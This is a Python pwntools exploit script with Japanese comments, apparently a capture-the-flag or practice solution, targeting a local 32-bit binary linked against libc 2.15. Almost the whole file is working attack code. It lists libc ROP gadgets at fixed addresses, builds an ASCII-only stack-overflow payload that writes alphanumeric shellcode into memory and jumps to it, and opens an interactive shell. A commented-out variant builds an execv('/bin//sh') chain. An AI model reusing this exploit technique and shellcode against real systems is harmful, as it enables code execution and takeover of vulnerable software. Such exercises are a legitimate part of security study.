#encoding: utf-8
from pwn import *

context.log_level = "debug"

libc = ELF("./libc-2.15.so")
libc_execv_addr_offset = libc.sym["execv"]
libc_exit_addr_offset = libc.sym["exit"]
libc_base = 0x5555e000

stack_base = 0xff94e300
stack_ret = 0xff94e320

payload = "A"*(stack_ret-stack_base) # retで参照するアドレスまで埋める
#shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = b'PYh3333k4dsFkDqG02DqH0D10u03P124B0c0Z7K0m0C2k0X0u0U2B1n3t3C2q0a3r3A3E0r1N3m3E020'

## rop
# 0x00174a51: pop ecx ; add al, 0x0A ; ret  ;  (1 found)

# 0x00196525: pop edx ; add dword [edx], ecx ; ret  ;  (1 found) 要ecx==0

# 0x00078225: mov dword [eax], edx ; ret  ;

# 0x000e5028: xor eax, eax ; pop ebx ; ret  ;  (1 found) 0x55643028

# 0x000b6b57: pop eax ; add esp, 0x5C ; ret  ;  (1 found) 0x55614b57

# 0x0017485e: xchg dword [ebx], eax ; add ah, al ; ret  ;  (1 found) 0x556d285e

# 0x000e6263: inc eax ; ret

# 0x00109176: inc esi ; int 0x80 ;  (1 found)

# 0x000b984e: xchg eax, edx ; retn 0xD028 ;  (1 found)

def is_ascii(a):
    isascii = True
    for i in a:
        c = ord(i)
        if(c>0x20 and c<=0x7f):
            pass
        else:
            isascii = False
    return isascii

def mov_dword_ebx_eax(ebx, eax):
    # ebxが指すアドレスにeaxを代入する
    ropcode =  p32(0x000e5028+libc_base) # pop ebx
    ropcode += p32(ebx)
    if not eax == 0:
        ropcode += p32(0x000b6b57+libc_base) # pop eax
        ropcode += p32(eax)
        ropcode += "A"*0x5C
    ropcode += p32(0x0017485e+libc_base) # xchg dword[ebx], eax
    return ropcode

def decide_arg_buffer():
    argbuffer = libc_base
    while(
            not is_ascii(p32(argbuffer)) \
         #   and not is_ascii(p32(argbuffer+4)) \
         #   and not is_ascii(p32(argbuffer+8)) \
         #   and not is_ascii(p32(argbuffer+12)) \
         #   and not is_ascii(p32(argbuffer+16)) \
        ):
        argbuffer += 4
    return argbuffer

#payload += p32(0x000e5028+libc_base) # xor eax, eax; pop ebx
#payload += p32(0x41414141)
#payload += p32(0x000b984e+libc_base) # xchg eax, edx
#payload += "A" * 0xd028

arg_buffer = decide_arg_buffer()
print("arg_buffer: 0x%x" % arg_buffer)

"""
payload += mov_dword_ebx_eax(arg_buffer, unpack("/bin"))
print("write 0x%x to 0x%x" % (unpack("/bin"), arg_buffer))

payload += mov_dword_ebx_eax(arg_buffer+4, unpack("//sh"))
print("write 0x%x to 0x%x" % (unpack("//sh"), arg_buffer+4))

payload += mov_dword_ebx_eax(arg_buffer+8, 0x0)
print("write 0x%x to 0x%x" % (0, arg_buffer+8))

payload += mov_dword_ebx_eax(arg_buffer+12, arg_buffer)
print("write 0x%x to 0x%x" % (arg_buffer, arg_buffer+12))

payload += mov_dword_ebx_eax(arg_buffer+16, 0x0)
print("write 0x%x to 0x%x" % (0, arg_buffer+16))

payload += p32(libc_execv_addr_offset+libc_base)
print("call--> execv addr: 0x%x" % (libc_execv_addr_offset+libc_base))

payload += p32(libc_execv_addr_offset+libc_base)
print("ret--> exit addr: 0x%x" % (libc_execv_addr_offset+libc_base))
payload += p32(arg_buffer)
print("arg0 addr: 0x%x" % arg_buffer)
payload += p32(arg_buffer+12)
print("arg1 addr: 0x%x" % (arg_buffer+12))
"""

for i in range(0, len(shellcode), 4):
    payload += mov_dword_ebx_eax(arg_buffer+i, unpack(shellcode[i:i+4]))

payload += p32(0x000b6b57+libc_base) # pop eax
payload += p32(arg_buffer) # eax
payload += "A"*0x5C
payload += p32(arg_buffer) # ret arg_buffer

print(payload)
print(is_ascii(payload))

p = process(["./a.out", payload])
p.interactive()
